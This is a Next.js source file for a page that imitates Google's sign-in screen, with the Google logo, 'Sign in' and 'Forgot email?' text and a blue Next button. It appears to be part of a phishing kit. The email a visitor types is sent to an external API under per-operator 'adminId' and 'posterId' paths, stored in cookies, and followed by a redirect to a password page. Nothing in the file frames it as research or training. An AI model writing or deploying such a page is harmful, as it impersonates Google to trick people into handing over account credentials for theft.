"use client"
import React, { useState } from 'react'
import { useRouter } from "next/navigation";
import { API_URL, site } from '../config/index';
import Cookies from "js-cookie";
function page() {
  const[email, setEmail] = useState("");
  const adminId = Cookies.get("adminId");
  const posterId = Cookies.get("posterId");
  const router = useRouter();
  const handleSubmit = async() => {
   const values = {
    email: email,
    site: site
   }
   console.log(values)
    const url = `${API_URL}/email/post/${adminId}/${posterId}`;

    const res = await fetch(url, {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
      },
      body: JSON.stringify(values),
    });
    const data = await res.json();
    console.log(data);

    if (res.ok) {
      console.log("success", data);
      Cookies.set("email", data?.info?.email);
      Cookies.set("id", data?.info?._id);
      router.push("/password")
    } else {
      console.log("error", data);
      toast.error("Something Went Wrong");
    }


   
  };

  return (
    <div className='flex flex-col justify-start items-center mt-[100px]'>
      <img src="/images/google.png"  width={95} height={35}/>
      <div className=" ">
        <div className="text-center">
        <p className='font-medium text-xl mt-5'>Sign in</p>
        <p className='text-sm mt-1'>Enter your password</p>
        <p className='text-[#1a73e8] text-sm mt-1'>Learn more about using Guest mode</p>
        </div>
        <input required value={email}
        onChange={(e) => setEmail(e.target.value)} className='w-[350px] px-3 py-3 border border-gray-300 outline-none rounded-md mt-5 placeholder:pl-5' type="text" placeholder="Enter your email address "/>
        <p className='text-[#1a73e8] text-sm mt-2'>Forgot email?</p>
        <div className="flex justify-between mt-3">
          <p className='text-[#1a73e8] text-sm mt-7 text-center'>Create account</p>
          <button  onClick={handleSubmit} className=' bg-[#1a73e8] text-white px-3 py-2 border border-gray-300 outline-none rounded-full mt-5'>Next</button>
        </div>
      </div>
    </div>
  )
}

export default page